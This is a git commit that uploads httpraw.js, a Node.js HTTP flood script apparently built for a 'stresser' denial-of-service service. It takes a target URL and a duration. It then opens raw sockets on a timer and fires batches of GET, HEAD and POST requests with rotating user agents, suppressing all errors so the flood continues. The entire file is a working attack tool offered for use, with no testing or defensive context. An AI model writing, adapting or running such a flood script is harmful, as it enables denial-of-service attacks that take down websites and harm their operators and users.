3bceb482aa3adfce9262614ebd14afe3915db8d0
aurenstresser404 <obilibila@gmail.com>
2026-05-20 18:44:02 +0700

    Add files via upload

---
+++ httpraw.js
@@ -0,0 +1,61 @@
+const fs = require('fs');
+const url = require('url');
+const net = require('net');
+if (process.argv.length <= 2) {
+	console.log("node HTTP-RAW.js url time");
+	process.exit(-1);
+}
+var target = process.argv[2];
+var parsed = url.parse(target);
+var host = url.parse(target).host;
+var time = process.argv[3];
+
+process.on('uncaughtException', function (e) { });
+process.on('unhandledRejection', function (e) { });
+
+function loadUserAgents(filePath) {
+    try {
+        const data = fs.readFileSync(filePath, 'utf-8');
+        return data.split('\n').map(line => line.trim()).filter(line => line);
+    } catch (err) {
+        console.error("Error reading user agents file:", err);
+        process.exit(-1);
+    }
+}
+
+const userAgents = loadUserAgents('ua.txt');
+
+function loadUserAgents(filePath) {
+    try {
+        const data = fs.readFileSync(filePath, 'utf-8');
+        return data.split('\n').map(line => line.trim()).filter(line => line);
+    } catch (err) {
+        console.error("Error reading user agents file:", err);
+        process.exit(-1);
+    }
+}
+
+const nullHexs = [
+"\x00", 
+"\xFF", 
+"\xC2", 
+"\xA0"
+];
+
+var int = setInterval(() => {
+    var s = require('net').Socket();
+    s.connect(80, host);
+    s.setTimeout(10000);
+    for (var i = 0; i < 400; i++) {
+        s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
+		s.write('HEAD ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
+		s.write('POST ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
+    }
+    s.on('data', function () {
+        setTimeout(function () {
+            s.destroy();
+            return delete s;
+        }, 5000);
+    })
+});
+setTimeout(() => clearInterval(int), time * 1000);
